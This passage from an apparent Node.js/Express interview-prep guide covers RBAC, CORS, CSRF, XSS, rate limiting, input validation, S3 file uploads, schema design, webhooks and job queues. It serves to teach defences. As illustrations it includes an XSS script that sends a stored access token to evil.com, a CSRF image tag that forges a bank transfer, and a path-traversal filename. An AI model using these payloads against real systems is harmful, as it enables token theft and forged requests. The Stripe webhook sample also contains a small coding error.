// Example hashes (same password, different salts):
// "password" → $2b$12$XJHlKxf3r...      ← different each time
// "password" → $2b$12$mQpAb2F9k...      ← due to random salt
```

---

### Q35. What is RBAC and how do you implement it in APIs? `**`

**RBAC (Role-Based Access Control)** — assign permissions to roles, assign roles to users. Users get permissions indirectly through their role(s).

```js
// User model with role
{ name: 'Alice', role: 'admin' }
{ name: 'Bob',  role: 'user' }

// Permissions map
const permissions = {
  admin:  ['read', 'write', 'delete', 'manage_users'],
  editor: ['read', 'write'],
  user:   ['read']
};

// Middleware
const hasPermission = (permission) => (req, res, next) => {
  const userPerms = permissions[req.user.role] || [];
  if (!userPerms.includes(permission)) {
    return res.status(403).json({ error: 'Insufficient permissions' });
  }
  next();
};

// Routes
app.get('/posts',         authenticate, hasPermission('read'),        getPosts);
app.post('/posts',        authenticate, hasPermission('write'),       createPost);
app.delete('/posts/:id',  authenticate, hasPermission('delete'),      deletePost);
app.get('/admin/users',   authenticate, hasPermission('manage_users'), getUsers);
```

---

### Q36. What is CORS, why does it happen, and how to handle it in Express? `**`

**CORS (Cross-Origin Resource Sharing)** is a browser security mechanism that blocks web pages from making requests to a different origin (domain, port, or protocol) than the one that served the page.

```
Frontend: http://localhost:3000
Backend:  http://localhost:5000   ← different port = different origin → CORS blocked!
```

**How to fix in Express:**
```js
const cors = require('cors');

// Allow all origins (dev only)
app.use(cors());

// Production — allow specific origins
app.use(cors({
  origin: ['https://myapp.com', 'https://www.myapp.com'],
  credentials: true,          // allow cookies
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
```

> CORS is a **browser** restriction — Postman/curl are not affected. Server-to-server calls also bypass CORS.

---

### Q37. What is CSRF and how do you prevent it when using cookies? `**`

**CSRF (Cross-Site Request Forgery)** — an attacker tricks a logged-in user's browser into making an unintended request to your server (since cookies are automatically sent).

```
1. User is logged into bank.com (cookie: sessionToken=abc)
2. User visits evil.com
3. evil.com has: <img src="https://bank.com/transfer?to=attacker&amount=1000">
4. Browser sends request WITH the cookie automatically → transfer happens!
```

**Prevention:**
```js
// Option 1: SameSite cookie attribute (best defense)
res.cookie('sessionToken', token, {
  sameSite: 'Strict', // cookie not sent on cross-site requests
  httpOnly: true,
  secure: true
});

// Option 2: CSRF tokens (for non-SameSite support)
const csrf = require('csurf');
app.use(csrf({ cookie: true }));
app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() }); // embed in form
});
// Form submission includes csrf token → server validates
```

---

### Q38. What is XSS and how does it impact token storage decisions? `**`

**XSS (Cross-Site Scripting)** — attacker injects malicious JavaScript into your web page, which then executes in other users' browsers.

```html
<!-- Stored XSS example — attacker submits this as a comment -->
<script>
  // If token is in localStorage, attacker can steal it:
  fetch('https://evil.com/steal?token=' + localStorage.getItem('accessToken'));
</script>
```

**Impact on token storage:**
- `localStorage` / `sessionStorage` → **accessible by JS** → stolen by XSS
- `httpOnly cookies` → **not accessible by JS** → XSS-safe

**Preventing XSS:**
```js
// 1. Sanitize all user input before storing/rendering
const sanitizeHtml = require('sanitize-html');
const clean = sanitizeHtml(userInput);

// 2. Use Content Security Policy header
res.setHeader('Content-Security-Policy', "default-src 'self'");

// 3. Express Helmet (sets secure headers including CSP)
const helmet = require('helmet');
app.use(helmet());

// 4. Validate and escape output in templates
```

---

### Q39. What is rate limiting and where would you implement it? `**`

**Rate limiting** restricts how many requests a client can make in a time window — prevents abuse, DDoS, brute-force attacks.

```js
// At application level (express-rate-limit)
const rateLimit = require('express-rate-limit');

// Global limit
app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 100 })); // 100 req per 15 min

// Stricter limit for auth routes
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10, // only 10 login attempts per 15 min
  message: 'Too many login attempts. Try again later.',
  standardHeaders: true,
  skipSuccessfulRequests: true // don't count successful logins
});
app.use('/auth', authLimiter);
```

**Where to implement:**

| Layer | Pros | Cons |
|---|---|---|
| **API Gateway** (Nginx, AWS API Gateway) | Blocks before hitting app | Additional infrastructure |
| **App level** (express-rate-limit) | Easy, fine-grained per-route | Bypassed if multiple app instances (use Redis store) |
| **CDN** (Cloudflare) | Blocks at edge, globally | Costs money |

---

### Q40. What is input validation vs sanitization? `**`

| | Validation | Sanitization |
|---|---|---|
| **Purpose** | Check if data is in correct format | Clean/transform data to remove harmful content |
| **Action on failure** | Reject the request (400 error) | Modify the data silently |
| **Examples** | Is email a valid format? Is age a number? | Remove `<script>` tags, trim whitespace, escape HTML |

```js
const { body, validationResult } = require('express-validator');

app.post('/users',
  // Validation rules
  body('email').isEmail().normalizeEmail(),
  body('age').isInt({ min: 0, max: 120 }),
  body('name').trim().notEmpty().isLength({ max: 50 }),
  body('bio').escape(), // sanitize — escape HTML chars

  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    // proceed with clean, validated data
  }
);
```

**Where to do it:** Always at the **entry point** — request middleware/controller, before it reaches business logic or DB. Never trust client-sent data.

---

## 6. File Uploads & AWS S3

---

### Q41. What is Multer and why is it used in Node/Express? `***`

**Multer** is an Express middleware for handling `multipart/form-data` — the encoding type used for file uploads.

Without Multer, Express's `body-parser` cannot parse file data (binary).

```js
const multer = require('multer');

// Memory storage — file in req.file.buffer (good for cloud uploads)
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 5 * 1024 * 1024 }, // 5 MB max
  fileFilter: (req, file, cb) => {
    const allowed = ['image/jpeg', 'image/png', 'image/webp'];
    if (allowed.includes(file.mimetype)) cb(null, true);
    else cb(new Error('Only images allowed'), false);
  }
});

// Disk storage — file saved locally
const diskUpload = multer({
  storage: multer.diskStorage({
    destination: './uploads/',
    filename: (req, file, cb) => {
      cb(null, `${Date.now()}-${file.originalname}`);
    }
  })
});

// Routes
app.post('/upload/single', upload.single('avatar'), (req, res) => {
  // req.file = { originalname, mimetype, buffer, size }
  res.json({ message: 'Uploaded', filename: req.file.originalname });
});

app.post('/upload/multiple', upload.array('photos', 10), (req, res) => {
  // req.files = array of file objects
});
```

---

### Q42. Typical file upload pipeline: server upload vs direct-to-cloud. `**`

**Option 1: Upload through server**
```
Client → POST /upload (multipart) → Express (Multer) → Upload to S3 → Response
```
```js
// Server upload to S3
const { S3Client, PutObjectCommand } = require('@aws-sdk/client-s3');
const s3 = new S3Client({ region: 'ap-south-1' });

app.post('/upload', upload.single('file'), async (req, res) => {
  const key = `uploads/${Date.now()}-${req.file.originalname}`;
  await s3.send(new PutObjectCommand({
    Bucket: process.env.S3_BUCKET,
    Key: key,
    Body: req.file.buffer,
    ContentType: req.file.mimetype
  }));
  res.json({ url: `https://${process.env.S3_BUCKET}.s3.amazonaws.com/${key}` });
});
```

**Option 2: Direct-to-cloud (pre-signed URL)** *(Recommended)*
```
Client → GET /upload-url → Server generates pre-signed URL → Client uploads directly to S3
                                                               ↓
                                              Client → notify server with S3 key
```

**Comparison:**

| | Server Upload | Direct to Cloud |
|---|---|---|
| **Bandwidth** | Uses server bandwidth | Saves server bandwidth |
| **Speed** | Slower (two hops) | Faster (direct to S3) |
| **Server load** | High (large files) | Low |
| **Control** | Full (validate before upload) | Partial (validate after) |

---

### Q43. What is AWS S3 conceptually and how does access control work? `**`

**S3 (Simple Storage Service)** — object storage service for storing any amount of data.

**Core concepts:**
- **Bucket** — top-level container (like a hard drive); name must be globally unique
- **Object** — a file stored in a bucket (can be up to 5TB)
- **Key** — the object's path/name within the bucket (e.g., `avatars/user1/photo.jpg`)

```
s3://my-bucket/avatars/user1/photo.jpg
       └──────┘ └─────────────────────┘
       bucket            key
```

**Access Control (IAM basics):**
```js
// IAM Policy — grants specific S3 permissions
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["s3:PutObject", "s3:GetObject"],
    "Resource": "arn:aws:s3:::my-bucket/*"
  }]
}

// Bucket Policy — controls who can access the bucket
// Block public access for sensitive data (use pre-signed URLs for access)
```

---

### Q44. What is a pre-signed URL and why is it recommended? `**`

A **pre-signed URL** is a temporary URL that grants time-limited access to a private S3 object — without making it public.

```js
const { S3Client, PutObjectCommand, GetObjectCommand } = require('@aws-sdk/client-s3');
const { getSignedUrl } = require('@aws-sdk/s3-request-presigner');

const s3 = new S3Client({ region: 'ap-south-1' });

// Generate upload URL (PUT) — client uploads directly
app.get('/upload-url', authenticate, async (req, res) => {
  const key = `uploads/${req.user.id}/${Date.now()}.jpg`;
  const command = new PutObjectCommand({
    Bucket: process.env.S3_BUCKET,
    Key: key,
    ContentType: 'image/jpeg'
  });
  const url = await getSignedUrl(s3, command, { expiresIn: 300 }); // 5 min
  res.json({ uploadUrl: url, key });
});

// Generate download URL (GET) — for private files
app.get('/download-url/:key', authenticate, async (req, res) => {
  const command = new GetObjectCommand({
    Bucket: process.env.S3_BUCKET,
    Key: req.params.key
  });
  const url = await getSignedUrl(s3, command, { expiresIn: 3600 }); // 1 hour
  res.json({ downloadUrl: url });
});
```

**Why recommended:**
- ✅ Keep bucket private (no public access)
- ✅ Client uploads directly — saves server bandwidth
- ✅ URL expires — limits unauthorized access window
- ✅ Server doesn't need to handle large file streams

---

### Q45. Common security concerns in file upload systems. `**`

| Threat | Risk | Mitigation |
|---|---|---|
| **Type spoofing** | Rename `malware.exe` → `photo.jpg` | Check MIME type from file content (magic bytes), not just extension |
| **Size limits** | 1GB file upload crashes server | Enforce `limits.fileSize` in Multer |
| **Malware** | Upload virus-infected file | Scan with antivirus (ClamAV) or AWS GuardDuty |
| **Path traversal** | Filename `../../etc/passwd` | Sanitize filenames, use UUIDs as keys |
| **Stored XSS** | Upload `.html` file served inline | Never serve uploads from your domain; use S3/CDN |
| **Overwriting files** | Same filename overwrites existing | Prefix with user ID + timestamp + UUID |

```js
// Secure file handling
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const safeKey = (originalName) => {
  const ext = path.extname(originalName).toLowerCase();
  const allowedExts = ['.jpg', '.jpeg', '.png', '.pdf'];
  if (!allowedExts.includes(ext)) throw new Error('Invalid file type');
  return `uploads/${uuidv4()}${ext}`; // unique, no original name
};
```

---

## 7. System Design Concepts

---

### Q46. Design an e-commerce schema: User, Product, Order. `***`

**MongoDB / Mongoose approach:**

```js
// User
const userSchema = new Schema({
  name:     { type: String, required: true },
  email:    { type: String, unique: true, required: true },
  password: String,
  address:  {
    street: String, city: String, state: String, pincode: String
  },
  role:     { type: String, enum: ['customer', 'admin'], default: 'customer' }
});

// Product
const productSchema = new Schema({
  name:        { type: String, required: true },
  description: String,
  price:       { type: Number, required: true, min: 0 },
  stock:       { type: Number, default: 0 },
  category:    String,
  images:      [String],                    // S3 URLs
  seller:      { type: Schema.Types.ObjectId, ref: 'User' }
});

// Order
const orderSchema = new Schema({
  user:     { type: Schema.Types.ObjectId, ref: 'User', required: true },
  items: [{
    product:  { type: Schema.Types.ObjectId, ref: 'Product' },
    quantity: Number,
    price:    Number  // snapshot price at time of order
  }],
  totalAmount: Number,
  status:      { type: String, enum: ['pending', 'confirmed', 'shipped', 'delivered', 'cancelled'], default: 'pending' },
  shippingAddress: { street: String, city: String, state: String, pincode: String },
  paymentStatus:   { type: String, enum: ['pending', 'paid', 'refunded'] },
  createdAt:       { type: Date, default: Date.now }
});
```

**SQL equivalent (PostgreSQL):**

```sql
-- Users
CREATE TABLE users (
  id         SERIAL PRIMARY KEY,
  name       VARCHAR(100) NOT NULL,
  email      VARCHAR(100) UNIQUE NOT NULL,
  password   TEXT,
  role       VARCHAR(20) DEFAULT 'customer',
  created_at TIMESTAMP DEFAULT NOW()
);

-- Products
CREATE TABLE products (
  id          SERIAL PRIMARY KEY,
  name        VARCHAR(200) NOT NULL,
  price       DECIMAL(10,2) NOT NULL,
  stock       INT DEFAULT 0,
  category    VARCHAR(100),
  seller_id   INT REFERENCES users(id)
);

-- Orders
CREATE TABLE orders (
  id               SERIAL PRIMARY KEY,
  user_id          INT REFERENCES users(id),
  total_amount     DECIMAL(10,2),
  status           VARCHAR(50) DEFAULT 'pending',
  created_at       TIMESTAMP DEFAULT NOW()
);

-- Order Items (junction table — one order, many products)
CREATE TABLE order_items (
  id         SERIAL PRIMARY KEY,
  order_id   INT REFERENCES orders(id),
  product_id INT REFERENCES products(id),
  quantity   INT,
  price      DECIMAL(10,2)  -- snapshot price
);
```

---

### Q47. One-to-many vs many-to-many: how to model in Mongo vs SQL? `**`

**One-to-many (e.g., User → Orders):**
```js
// MongoDB — reference
{ _id: "order1", userId: ObjectId("user1"), items: [...] }
// Query: Order.find({ userId: req.user.id })

// SQL — foreign key
CREATE TABLE orders (user_id INT REFERENCES users(id));
-- Query: SELECT * FROM orders WHERE user_id = 1;
```

**Many-to-many (e.g., Students ↔ Courses):**
```js
// MongoDB — array of references
{ _id: "student1", courseIds: [ObjectId("c1"), ObjectId("c2")] }
// Or on both sides, or use a separate collection

// SQL — junction (join) table
CREATE TABLE student_courses (
  student_id INT REFERENCES students(id),
  course_id  INT REFERENCES courses(id),
  enrolled_at TIMESTAMP,
  PRIMARY KEY (student_id, course_id)
);
-- Query: JOIN student_courses ON students.id = student_courses.student_id
```

---

### Q48. What are webhooks? How are they different from polling? `**`

| | Polling | Webhooks |
|---|---|---|
| **Mechanism** | Client repeatedly asks "any updates?" | Server pushes updates when they happen |
| **Efficiency** | Wasteful — most calls return nothing | Efficient — only fires on events |
| **Latency** | Depends on poll interval | Near real-time |
| **Complexity** | Simple | Server needs a public URL |
| **Use cases** | Simple status checks | Payment events, GitHub events, Stripe |

```js
// Webhook endpoint — receives events from Stripe
app.post('/webhooks/stripe', express.raw({ type: 'application/json' }), (req, res) => {
  // Verify signature (CRITICAL — prevents fake events)
  const sig = req.headers['stripe-signature'];
  let event;
  try {
    event = stripe.webhooks.constructEvent(req.body, sig, process.env.STRIPE_WEBHOOK_SECRET);
  } catch (err) {
    return res.status(400).json({ error: 'Webhook signature verification failed' });
  }

  // Handle event types
  switch (event.type) {
    case 'payment_intent.succeeded':
      const payment = event.data.object;
      await Order.updateOne({ paymentIntentId: payment.id }, { paymentStatus: 'paid' });
      break;
    case 'payment_intent.payment_failed':
      // handle failure
      break;
  }

  res.json({ received: true }); // Acknowledge within 5 seconds or Stripe retries
});
```

**Retries:** Webhook providers retry on failure (e.g., Stripe retries for 3 days). Make endpoints **idempotent** — processing the same event twice should be harmless.

---

### Q49. How do you handle long-running requests? `**`

**The problem:** HTTP has timeouts (~30-60 seconds). Tasks like video encoding or sending 10,000 emails take minutes.

**Solution: Background Job Queues**

```
Client → POST /export-report → Server returns 202 Accepted + jobId
                                    ↓
                              Adds job to queue (Bull/BullMQ)
                                    ↓
                         Worker process picks up job
                                    ↓
                         Worker completes task (may take minutes)
                                    ↓
                         Stores result / sends email / webhook

Client → GET /jobs/:jobId/status → { status: "processing", progress: 45% }
Client → GET /jobs/:jobId/status → { status: "completed", downloadUrl: "..." }
```

```js
const Queue = require('bull');
const emailQueue = new Queue('emails', { redis: { host: 'localhost', port: 6379 } });

// Add job to queue
app.post('/send-bulk-email', authenticate, async (req, res) => {
  const job = await emailQueue.add({ recipients: req.body.emails, template: 'welcome' });
  res.status(202).json({ jobId: job.id, message: 'Processing started' });
});

// Worker processes jobs (separate process)
emailQueue.process(async (job) => {
  const { recipients, template } = job.data;
  for (const [i, email] of recipients.entries()) {
    await sendEmail(email, template);
    job.progress(Math.round((i / recipients.length) * 100)); // update progress
  }
});

// Check status
app.get('/jobs/:id', authenticate, async (req, res) => {
  const job = await emailQueue.getJob(req.params.id);
  res.json({ status: await job.getState(), progress: job.progress() });
});
```

**Tools:** Bull/BullMQ (Redis-based), Agenda (MongoDB-based), AWS SQS + Lambda

---

## Quick Reference Summary

| Topic | Key Takeaway |
|---|---|
| Node concurrency | Single thread + non-blocking I/O + event loop |
| Event loop | 6 phases: timers → pending → idle → poll → check → close |
| Microtasks | `process.nextTick` > `Promise.then` > macrotasks |
| Libuv pool | Used by fs, crypto, dns.lookup — default 4 threads |
| Blocking ops | Dangerous — freeze all requests; always use async APIs |
| Clusters | One process per CPU core; share same port |
| Streams | Process data in chunks; avoid memory overload |
| Middleware | Functions in a chain; must call `next()` |
| MVC | Routes → Controllers → Services → Models |
| Error handling | Centralized middleware + `next(err)` + `asyncHandler` |
| REST | Stateless, uniform interface, resource-based URLs |
| PUT vs PATCH | PUT = replace all; PATCH = update partial |
| JWT flow | accessToken (short) + refreshToken (long) + rotation |
| Bcrypt | Slow by design; salt + work factor |
| Tokens storage | httpOnly cookie (safe from XSS); CSRF protection needed |
| CORS | Browser restriction; fix with `cors()` middleware |
| CSRF | Cookie auto-send exploit; prevent with SameSite + CSRF token |
| Multer | Parse multipart/form-data file uploads |
| Pre-signed URL | Temporary S3 URL; client uploads directly; saves server bandwidth |
| Connection pool | Reuse DB connections; avoid per-request connection overhead |
| Embedding vs ref | Embed: co-located, few items; Reference: shared, large |
| Transactions | Needed when multiple writes must be atomic |
| Indexing | Speeds up reads; slows writes; index query fields |
| Webhooks | Server pushes events; always verify signature; make idempotent |
| Long-running tasks | Return 202 immediately; use job queues (Bull + Redis) |

---

*Good luck with your interviews! ⭐ Star this repo if it helped you.*